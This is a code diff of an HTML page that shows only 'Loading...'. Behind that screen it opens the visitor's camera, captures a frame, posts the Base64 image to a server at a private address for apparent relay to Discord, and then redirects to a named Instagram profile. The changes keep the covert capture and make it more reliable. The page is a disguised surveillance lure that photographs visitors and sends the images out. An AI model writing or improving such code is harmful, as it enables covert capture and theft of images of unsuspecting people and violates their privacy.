@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect After Photo Capture</title>
+    <title>Capture and Send to Discord</title>
 </head>
 <body>
     <h1>Loading...</h1>
@@ -19,37 +19,47 @@
                 video.play();
 
                 // Wait for video to start playing
-                await new Promise(resolve => video.onplaying = resolve);
-
-                // Capture a frame from the video
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext("2d");
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Stop the video stream
-                stream.getTracks().forEach(track => track.stop());
-
-                // Convert the image to a data URL (Base64)
-                const imageData = canvas.toDataURL("image/png");
-
-                // Send the image to the server (you can replace the URL with your server)
-                const response = await fetch("http://localhost:3000", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ image: imageData })
+                await new Promise((resolve) => {
+                    video.onplaying = resolve;
                 });
 
-                if (response.ok) {
-                    // Redirect the user to the destination site
-                    window.location.href = "https://www.instagram.com/f_arsenova/tagged/";
+                // Ensure the video is playing before taking the photo
+                if (!video.paused && !video.ended) {
+                    // Capture a frame from the video
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext("2d");
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Stop the video stream
+                    stream.getTracks().forEach((track) => track.stop());
+
+                    // Convert the image to a data URL (Base64)
+                    const imageData = canvas.toDataURL("image/png");
+
+                    // Send the image to the server (replace with your backend URL)
+                    const response = await fetch("http://192.168.1.100:3000/upload", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ image: imageData }),
+                    });
+
+                    if (response.ok) {
+                        console.log("Photo sent to Discord successfully.");
+                        // Redirect the user to the destination site (Instagram)
+                        window.location.href = "https://www.instagram.com/f_arsenova/tagged/";
+                    } else {
+                        console.log("Failed to send the photo.");
+                        alert("Failed to send the photo.");
+                    }
                 } else {
-                    alert("Failed to send the photo.");
+                    console.error("Video is not playing. Cannot capture photo.");
+                    alert("Camera stream is not working properly.");
                 }
             } catch (error) {
                 console.error("Error capturing or sending the photo:", error);
-                alert("An error occurred. Please try again.");
+                alert("An error occurred. Please check your camera permissions or try again.");
             }
         }
 
